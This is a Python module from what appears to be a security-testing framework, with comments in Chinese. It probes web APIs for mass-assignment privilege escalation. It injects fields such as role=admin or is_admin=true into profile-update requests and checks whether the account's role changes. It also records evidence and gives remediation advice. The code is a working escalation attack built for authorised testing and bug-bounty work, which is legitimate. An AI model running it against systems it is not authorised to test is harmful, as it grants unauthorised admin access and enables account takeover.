# -*- coding: utf-8 -*-
from typing import Dict, Any, List, Tuple, Optional
from urllib.parse import urljoin
import json
import time
from datetime import datetime
from ..base.feature_base import FeatureBase
from ..base.feature_registry import FeatureRegistry
from ..base.result_schema import FeatureResult, Finding
from ..base.http_client import SafeHttp

# 常見的權限提升相關欄位
PRIV_FIELDS = [
    "role", "roles", "is_admin", "admin", "isAdmin", "isSuperuser", "superuser",
    "privilege", "privileges", "permission", "permissions", "group", "groups", 
    "plan", "tier", "quota", "credits", "balance", "is_staff", "staff",
    "level", "access_level", "user_type", "account_type", "membership"
]

# v2.5 新增：欄位矩陣分析
FIELD_IMPACT_MATRIX = {
    "role": {"weight": 10, "critical_values": ["admin", "administrator", "root", "superuser"]},
    "is_admin": {"weight": 10, "critical_values": [True, "true", 1, "1"]},
    "privilege": {"weight": 9, "critical_values": ["admin", "superuser", "root"]},
    "permissions": {"weight": 9, "critical_values": ["*", "all", "admin"]},
    "group": {"weight": 8, "critical_values": ["administrators", "admins", "root"]},
    "plan": {"weight": 7, "critical_values": ["enterprise", "premium", "unlimited"]},
    "tier": {"weight": 7, "critical_values": ["enterprise", "premium", "gold"]},
    "quota": {"weight": 6, "critical_values": [999999, -1, "unlimited"]},
    "credits": {"weight": 6, "critical_values": [999999, -1, "unlimited"]},
    "level": {"weight": 5, "critical_values": [999, 100, "max"]},
}

@FeatureRegistry.register
class MassAssignmentWorker(FeatureBase):
    """
    Mass Assignment / 角色升權檢測模組 v2.5
    
    專門檢測透過 JSON 請求中的未授權欄位進行權限提升的漏洞。
    這類漏洞在 Bug Bounty 平台上經常能拿到 Critical 級別的高額獎金。
    
    v2.5 新增功能：
    - 欄位矩陣分析：智能評估欄位風險權重
    - 雙端點驗證：交叉驗證權限變更的持久性
    - 增強證據鏈：時間戳追蹤和多點驗證
    - 深度影響分析：評估權限提升的實際影響範圍
    
    檢測原理：
    1. 取得目標用戶的當前權限狀態
    2. 使用欄位矩陣智能選擇測試組合
    3. 嘗試在更新請求中注入權限相關欄位
    4. 雙端點驗證權限是否真的被提升
    5. 提供完整的時間戳證據鏈
    
    攻擊場景：
    - 個人資料更新 API 未做欄位白名單
    - 註冊 API 接受額外的角色參數
    - 設定 API 允許修改權限欄位
    """
    
    name = "mass_assignment"
    version = "2.5.0"
    tags = ["mass-assignment", "privilege-escalation", "broken-access-control", "critical"]
    
    def _analyze_field_matrix(self, fields: List[str]) -> List[Tuple[str, int]]:
        """
        v2.5 新增：欄位矩陣分析
        根據欄位的風險權重進行智能排序
        
        Returns:
            排序後的 (field, weight) 列表
        """
        weighted = []
        for field in fields:
            weight = FIELD_IMPACT_MATRIX.get(field, {}).get("weight", 1)
            weighted.append((field, weight))
        
        # 按權重降序排序
        weighted.sort(key=lambda x: x[1], reverse=True)
        return weighted
    
    def _dual_endpoint_verification(
        self, 
        http: SafeHttp,
        base: str,
        check_endpoints: List[str],
        check_key: str,
        headers: Dict[str, Any]
    ) -> Dict[str, Any]:
        """
        v2.5 新增：雙端點驗證
        在多個端點檢查權限狀態，確保結果一致性
        
        Returns:
            包含所有端點結果的字典
        """
        results = {}
        for endpoint in check_endpoints:
            url = urljoin(base, endpoint)
            try:
                r = http.request("GET", url, headers=headers)
                if r.status_code == 200:
                    data = r.json()
                    results[endpoint] = {
                        "status": "success",
                        "value": data.get(check_key),
                        "full_data": data,
                        "timestamp": datetime.utcnow().isoformat()
                    }
                else:
                    results[endpoint] = {
                        "status": "failed",
                        "status_code": r.status_code,
                        "timestamp": datetime.utcnow().isoformat()
                    }
            except Exception as e:
                results[endpoint] = {
                    "status": "error",
                    "error": str(e),
                    "timestamp": datetime.utcnow().isoformat()
                }
        
        return results
    
    def _build_evidence_chain(
        self,
        before_data: Dict[str, Any],
        after_data: Dict[str, Any],
        injection: Dict[str, Any],
        timestamps: Dict[str, str]
    ) -> Dict[str, Any]:
        """
        v2.5 新增：增強證據鏈
        構建完整的時間戳證據鏈
        
        Returns:
            包含完整證據的字典
        """
        return {
            "timeline": [
                {
                    "timestamp": timestamps.get("baseline", ""),
                    "action": "baseline_check",
                    "data": before_data,
                    "description": "初始權限狀態"
                },
                {
                    "timestamp": timestamps.get("injection", ""),
                    "action": "injection_attempt",
                    "data": injection,
                    "description": "權限提升嘗試"
                },
                {
                    "timestamp": timestamps.get("verification", ""),
                    "action": "verification",
                    "data": after_data,
                    "description": "權限變更驗證"
                }
            ],
            "changes": self._diff_data(before_data, after_data),
            "injection_fields": list(injection.keys()),
            "total_duration_ms": self._calculate_duration(timestamps)
        }
    
    def _diff_data(self, before: Dict[str, Any], after: Dict[str, Any]) -> List[Dict[str, Any]]:
        """計算數據變更"""
        changes = []
        all_keys = set(before.keys()) | set(after.keys())
        
        for key in all_keys:
            before_val = before.get(key)
            after_val = after.get(key)
            
            if before_val != after_val:
                changes.append({
                    "field": key,
                    "before": before_val,
                    "after": after_val,
                    "change_type": "modified" if key in before and key in after else "added" if key not in before else "removed"
                })
        
        return changes
    
    def _calculate_duration(self, timestamps: Dict[str, str]) -> float:
        """計算操作持續時間（毫秒）"""
        try:
            start = datetime.fromisoformat(timestamps.get("baseline", ""))
            end = datetime.fromisoformat(timestamps.get("verification", ""))
            return (end - start).total_seconds() * 1000
        except:
            return 0.0

    def run(self, params: Dict[str, Any]) -> FeatureResult:
        """
        執行 Mass Assignment 檢測 (v2.5)
        
        Args:
            params: 檢測參數
              - target (str): 基礎 URL，如 https://app.example.com
              - path (str): 更新端點，如 /api/profile/update
              - method (str): HTTP 方法，通常是 POST/PATCH/PUT
              - headers (dict): 低權限用戶的認證頭
              - baseline_body (dict): 正常的更新請求內容
              - check_endpoint (str): 驗證權限的端點，如 /api/me
              - check_endpoints (list): v2.5 多個驗證端點
              - check_key (str): 權限檢查的欄位名，如 'role'
              - attempt_fields (list): 可選，自定義嘗試的權限欄位
              
        Returns:
            FeatureResult: 包含檢測結果和證據
        """
        http = SafeHttp()
        base = params.get("target", "")
        path = params.get("path", "")
        method = (params.get("method") or "POST").upper()
        headers = params.get("headers") or {}
        baseline = params.get("baseline_body") or {}
        check_endpoint = params.get("check_endpoint") or "/api/me"
        # v2.5: 支持多個驗證端點
        check_endpoints = params.get("check_endpoints") or [check_endpoint]
        check_key = params.get("check_key") or "role"
        attempt_fields: List[str] = params.get("attempt_fields") or PRIV_FIELDS
        
        url = urljoin(base, path)
        findings: List[Finding] = []
        trace = []
        timestamps = {"start": datetime.utcnow().isoformat()}
        
        try:
            # 1) v2.5 雙端點基線檢查
            timestamps["baseline"] = datetime.utcnow().isoformat()
            baseline_results = self._dual_endpoint_verification(
                http, base, check_endpoints, check_key, headers
            )
            
            trace.append({
                "step": "baseline_check_v2.5",
                "endpoints": check_endpoints,
                "results": baseline_results,
                "timestamp": timestamps["baseline"]
            })
            
            # 獲取主要端點的原始值
            primary_endpoint = check_endpoints[0]
            original_value = baseline_results.get(primary_endpoint, {}).get("value")
            before_data = baseline_results.get(primary_endpoint, {}).get("full_data", {})
            
            if not original_value:
                # 如果無法獲取基線，依然繼續測試但降低可信度
                pass
            
            # 2) v2.5 欄位矩陣分析
            weighted_fields = self._analyze_field_matrix(attempt_fields)
            trace.append({
                "step": "field_matrix_analysis",
                "weighted_fields": weighted_fields[:10],  # 記錄前10個高優先級欄位
                "timestamp": datetime.utcnow().isoformat()
            })
            
            # 3) 智能選擇測試組合（基於權重）
            candidate_values = [
                "admin", "administrator", "superuser", "owner", "manager",
                True, 1, 999, "enterprise", "premium", "pro", "staff"
            ]
            
            combos = []
            for field, weight in weighted_fields[:15]:  # 優先測試高權重欄位
                critical_vals = FIELD_IMPACT_MATRIX.get(field, {}).get("critical_values", [])
                test_values = critical_vals[:2] if critical_vals else candidate_values[:2]
                
                for value in test_values:
                    combos.append({
                        "field": field,
                        "value": value,
                        "weight": weight
                    })
                    if len(combos) >= 20:
                        break
                if len(combos) >= 20:
                    break
            
            # 4) v2.5 逐組測試（智能注入）
            for i, combo in enumerate(combos):
                try:
                    field_name = combo["field"]
                    field_value = combo["value"]
                    
                    timestamps["injection"] = datetime.utcnow().isoformat()
                    
                    # 構建注入請求
                    injected = {**baseline, field_name: field_value}
                    
                    # 發送包含注入欄位的請求
                    r1 = http.request(
                        method, url, 
                        headers={**headers, "Content-Type": "application/json"},
                        data=json.dumps(injected)
                    )
                    
                    # v2.5 雙端點驗證
                    timestamps["verification"] = datetime.utcnow().isoformat()
                    verification_results = self._dual_endpoint_verification(
                        http, base, check_endpoints, check_key, headers
                    )
                    
                    trace.append({
                        "step": f"attempt_{i+1}",
                        "injection": {field_name: field_value},
                        "weight": combo["weight"],
                        "update_status": r1.status_code,
                        "verification_results": verification_results,
                        "timestamp": timestamps["verification"]
                    })
                    
                    # 解析驗證結果
                    primary_result = verification_results.get(primary_endpoint, {})
                    new_value = primary_result.get("value")
                    after_data = primary_result.get("full_data", {})
                    
                    # 判斷是否成功提升權限
                    escalated = False
                    if new_value and new_value != original_value:
                        escalated = True
                    elif new_value and not original_value:
                        escalated = True
                    
                    if escalated:
                        # v2.5 構建增強證據鏈
                        evidence_chain = self._build_evidence_chain(
                            before_data, after_data, {field_name: field_value}, timestamps
                        )
                        
                        # 驗證持久性（所有端點都應反映變更）
                        consistency_check = all(
                            verification_results.get(ep, {}).get("value") == new_value
                            for ep in check_endpoints
                        )
                        
                        findings.append(Finding(
                            vuln_type="Mass Assignment / Privilege Escalation (v2.5)",
                            severity="critical",
                            title=f"權限透過 {field_name}={field_value} 成功提升至 {new_value} (權重: {combo['weight']})",
                            evidence={
                                "changed_key": check_key,
                                "before_value": original_value,
                                "after_value": new_value,
                                "injected_field": field_name,
                                "injected_value": field_value,
                                "field_weight": combo["weight"],
                                "request_body": injected,
                                "update_response_status": r1.status_code,
                                "evidence_chain": evidence_chain,
                                "dual_verification": verification_results,
                                "consistency_verified": consistency_check,
                                "total_duration_ms": evidence_chain.get("total_duration_ms", 0)
                            },
                            reproduction=[
                                {
                                    "step": 1,
                                    "description": "檢查當前權限狀態（多端點）",
                                    "requests": [
                                        {
                                            "method": "GET",
                                            "url": urljoin(base, ep),
                                            "headers": headers
                                        }
                                        for ep in check_endpoints
                                    ],
                                    "expect": f"取得 {check_key}: {original_value}"
                                },
                                {
                                    "step": 2,
                                    "description": "嘗試權限提升",
                                    "request": {
                                        "method": method,
                                        "url": url,
                                        "headers": {**headers, "Content-Type": "application/json"},
                                        "json": injected
                                    },
                                    "expect": "伺服器應拒絕未授權的權限欄位"
                                },
                                {
                                    "step": 3,
                                    "description": "驗證權限變更（多端點交叉驗證）",
                                    "requests": [
                                        {
                                            "method": "GET",
                                            "url": urljoin(base, ep),
                                            "headers": headers
                                        }
                                        for ep in check_endpoints
                                    ],
                                    "expect": f"權限不應變更，但實際變為: {new_value}"
                                }
                            ],
                            impact=f"低權限用戶可透過未驗證的 JSON 欄位 '{field_name}' (風險權重:{combo['weight']}/10) 提升至管理員權限，完全繞過授權控制。多端點驗證確認漏洞持久性，可能導致帳戶接管、資料外洩、系統完全沦陷。",
                            recommendation="1. 實施嚴格的伺服器端欄位白名單（DTO/Serializer）\n2. 捨棄所有未明確允許的請求欄位\n3. 在後端添加額外的 ACL 檢查\n4. 權限變更需要額外的身分驗證步驟（如 2FA）\n5. 記錄所有權限變更操作供審計\n6. 實施欄位級別的 RBAC 控制\n7. 定期檢查權限提升攻擊面"
                        ))
                        
                        # 找到一個即停止，避免過度測試
                        break
                        
                except Exception as e:
                    trace.append({
                        "step": f"attempt_{i+1}_error",
                        "injection": {field_name: field_value} if 'field_name' in locals() else {},
                        "error": str(e),
                        "timestamp": datetime.utcnow().isoformat()
                    })
                    continue
            
            # 5) v2.5 建立增強命令記錄
            timestamps["end"] = datetime.utcnow().isoformat()
            cmd = self.build_command_record(
                command="mass_assignment.exploit.v2.5",
                description=f"Mass Assignment 權限提升檢測（智能矩陣分析） {path}",
                parameters={
                    "target": base,
                    "update_endpoint": path,
                    "check_endpoints": check_endpoints,
                    "check_key": check_key,
                    "attempts": len(combos),
                    "method": method,
                    "v2.5_features": [
                        "field_matrix_analysis",
                        "dual_endpoint_verification",
                        "evidence_chain",
                        "timestamp_tracking"
                    ]
                }
            )
            
            return FeatureResult(
                ok=bool(findings),
                feature=self.name,
                command_record=cmd,
                findings=findings,
                meta={
                    "version": "2.5.0",
                    "trace": trace,
                    "baseline_value": original_value,
                    "baseline_results": baseline_results,
                    "attempts_made": len(combos),
                    "weighted_fields_analyzed": len(weighted_fields),
                    "verification_endpoints": check_endpoints,
                    "timestamps": timestamps,
                    "execution_time": time.time()
                }
            )
            
        except Exception as e:
            # v2.5 處理異常情況
            timestamps["error"] = datetime.utcnow().isoformat()
            cmd = self.build_command_record(
                command="mass_assignment.exploit.v2.5",
                description=f"Mass Assignment 檢測失敗於 {path}",
                parameters={"target": base, "error": str(e), "timestamps": timestamps}
            )
            
            return FeatureResult(
                ok=False,
                feature=self.name,
                command_record=cmd,
                findings=[],
                meta={
                    "version": "2.5.0",
                    "error": str(e),
                    "trace": trace,
                    "timestamps": timestamps
                }
            )